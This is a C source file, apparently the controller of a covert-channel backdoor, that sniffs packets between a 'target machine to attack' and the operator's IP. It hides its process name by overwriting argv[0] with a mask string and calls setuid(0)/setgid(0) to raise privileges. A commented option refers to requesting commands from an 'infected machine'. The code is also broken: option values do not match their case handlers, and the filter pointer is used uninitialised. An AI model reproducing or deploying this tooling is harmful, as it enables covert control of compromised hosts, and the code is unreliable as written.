#include <getopt.h>
#include "../src/encrypt_utils.h"
#include "../src/socketwrappers.h"
#include "../src/covert_wrappers.h"
#include "../src/inotify.h"
#include "../src/libpcap.h"

static void print_usage(void) {
    puts ("Usage options: \n"
            "\t--nic      -   network interface to use\n"
            "\t--target   -   target machine to attack\n"
            //"\t--command  -   command to request from infected machine\n"
            "\t--local  -   your local ip\n"
            /*"\t--delay    -   delays between arp spoofs\n"*/);
}

static struct option long_options[] = {
    {"nic",     required_argument,  0,  0 },
    {"target",  required_argument,  0,  1 },
    //{"command",   required_argument,  0,  2 },
    {"local",    required_argument,  0,  3 },
    //{"delay",   optional_argument,  0,  4 },
    {0,         0,                  0,  0 }
};


int main(int argc, char **argv){
    int arg;
    char targetip[BUFFERSIZE];
    char localip[BUFFERSIZE];
    char *pcapfilter;
    strcpy(argv[0], MASK);
    //change the UID/GID to 0 to raise privs
    setuid(0);
    setgid(0);
    struct filter Filter;

    while (1) {
        int option_index = 0;

        arg = getopt_long(argc, argv, "", long_options, &option_index);

        if(arg == -1) {
            break;
        }

        switch (arg) {
            case 0:
                /*strncpy(nic, optarg, BUFFERSIZE);
                printf("Using NIC: %s\n", nic);*/
                break;
            case 1:
                strncpy(targetip, optarg, BUFFERSIZE);
                //printf("Target ip %s\n", targetip);
                break;
            case 2:
                strncpy(localip, optarg, BUFFERSIZE);
                //printf("Local ip %s\n", localip);
                Filter = InitFilter(targetip,localip);
                PrintFilter(Filter);
                break;
            case 3:
                break;
            /*case 4:
                break;*/
            default: /*  '?' */
                print_usage();
                exit(1);
        }
    }
    CreateFilter(Filter, pcapfilter);
    printf("Filter: %s\n",pcapfilter);
    Packetcapture(pcapfilter,Filter);

    return 0;
}
